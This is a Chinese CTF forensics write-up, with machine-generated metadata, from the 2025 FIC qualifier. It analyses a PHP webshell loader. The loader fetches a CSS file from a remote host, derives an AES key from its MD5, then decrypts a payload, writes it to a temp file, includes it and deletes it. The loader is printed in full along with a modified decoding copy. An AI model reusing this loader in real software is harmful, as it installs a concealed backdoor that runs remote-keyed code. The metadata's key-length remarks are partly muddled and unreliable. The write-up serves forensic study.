---
title: Web3 互联网取证—2025 FIC 晋级赛
contest: 2025 FIC 互联网取证晋级赛
year: 2025
difficulty: medium
vuln_type: web_unknown
tags:
- php_file_get_contents
- md5_true_raw_binary
- aes_256_cbc_decrypt
- openssl_raw_data
- php_included_shortcut
- web3_domain
- url_encoded_path
- foren6_atwebpages
- honey_pot_base
attack_chain: file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') → md5($a, true) raw 16 字节作 AES 密钥 → base64_decode(./encrypted.bin) → openssl_cipher_iv_length('aes-256-cbc') 取 IV → openssl_decrypt($h, 'aes-256-cbc', $b, OPENSSL_RAW_DATA, $g) → echo $i → 早期为 include + 临时目录一话木马
key_payload: $a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') / $b=md5($a,true) / $e='aes-256-cbc' / openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g)
one_liner: 2025 FIC 晋级赛 Web3 取证 PHP 一话木马分析，URL 编码的中文路径蜂蜜锅底.css 作密钥种子 + md5 raw + AES-256-CBC 解密 + include 一话木马。
lesson: PHP md5($a, true) 返回 16 字节原始二进制可作 AES-128 密钥；file_get_contents 支持中文 URL 编码路径，CSS 文件作密钥种子是创意取证点。
quality: medium
full_path: Web3互联网取证—2025FIC晋级赛.full.md
meta_path: Web3互联网取证—2025FIC晋级赛.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: Web3 互联网取证—2025 FIC 晋级赛。2025 FIC 晋级赛 Web3 取证 PHP 一话木马分析，URL 编码的中文路径蜂蜜锅底.css 作密钥种子 + md5 raw + AES-256-CBC 解密 + include 一话木马。。经验：PHP md5($a, true) 返回 16 字节原始二进制可作 AES-128 密钥；file_get_conten...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/243688.html
reasoning_chain:
- 触发点：2025 FIC 晋级赛 Web3 取证 → 假设：PHP 一话木马分析
- 动作：file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') → 假设：URL 编码中文路径作密钥种子
- 动作：$b=md5($a, true) → raw 16 字节作 AES-128 密钥 → $e='aes-256-cbc'
- 假设：openssl_cipher_iv_length('aes-256-cbc') = 16 字节 IV → $g=substr($d,0,$f)
- $h=substr($d,$f); $i=openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g) → 假设：拿到解密 PHP 代码
- 动作：file_put_contents($k, '<?php\n'.$i); include $k; unlink($k); yijuhua()
- 早期：include + 临时目录一话木马 → 假设：sys_get_temp_dir() 临时 PHP
- 观察：md5 raw binary 是 CTF 中常用的 16 字节 AES 密钥来源
- 观察：中文 URL 编码路径 %E7%81%AB%E9%94%85 作密钥种子是创意取证点
failed_attempts:
- 试图用 md5 hex 字符串作 AES key → 失败：必须 raw binary 才能匹配 AES 16 字节
- 早期一话木马 试图 cat ./func_*.php → 失败：unlink 已删除，必须在 include 时同步执行
- 试图读 ./encrypted.bin → 失败：必须先 base64_decode 再按 IV 切片
key_observations:
- PHP md5($a, true) 返回 16 字节原始二进制可作 AES-128 密钥
- file_get_contents 支持中文 URL 编码路径，CSS 文件作密钥种子是创意取证点
- PHP include 一话木马 + sys_get_temp_dir() 临时目录是常见 PHP 后门
- AES-256-CBC 16 字节 IV 切片是 openssl_decrypt 标准用法
- Web3 取证题常需要先 md5 hex→raw binary → AES 解密 PHP 源码的多步链
prerequisites:
- PHP md5 raw binary 输出
- PHP openssl_decrypt AES-256-CBC 解密
- URL 编码中文路径（%E7%81%AB%E9%94%85）
- PHP file_get_contents + sys_get_temp_dir + include 一话木马
- AES IV 切片与 OPENSSL_RAW_DATA 标志
---
# Web3互联网取证—2025FIC晋级赛

> 原文: https://www.ctfiot.com/243688.html
> ID: 243688

本栏目主要是针对比赛题目进行分析和解题思路分享，只进行知识分享，不具一定的实战能力，后台不解答涉及可能侵害他人权利的问题，切勿用于违法犯罪活动。如果有工作方面的解答需求，请后台联系添加微信私聊。

2025FIC晋级赛的WP在赛后这两天已经涌现出很多高质量的，在互联网取证部分很多参赛选手采用了先去Github搜索到信息的方法，我在此分享一下采用由弘连公司发行的《取证实录》中刊载的方法。以赛促练、以赛促学，借助2025FIC晋级赛的题目，学习简单的Web3域名相关的知识以及取证思维，同时随着行文给出参考文章方便各位读者延伸阅读。


```
$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css');$b=md5($a,true);$c=file_get_contents('../../../../encrypted.bin');$d=base64_decode($c);$e='aes-256-cbc';$f=openssl_cipher_iv_length($e);$g=substr($d,0,$f);$h=substr($d,$f);$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j.'/func_'.uniqid().'.php';file_put_contents($k,"<?phpn".$i);include $k;unlink($k);yijuhua();
<?php
$a=file_get_contents('./蜂蜜锅底.css');
$b=md5($a,true);
$c=file_get_contents('./encrypted.bin');
$d=base64_decode($c);
$e='aes-256-cbc';
$f=openssl_cipher_iv_length($e);
$g=substr($d,0,$f);
$h=substr($d,$f);
$i=openssl_decrypt($h,$e,$b,OPENSSL_RAW_DATA,$g);
echo$i;
//$j=sys_get_temp_dir();
//$k=$j.'/func_'.uniqid().'.php';
//file_put_contents($k,"<?phpn".$i);include $k;
//unlink($k);
//yijuhua();

?>
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]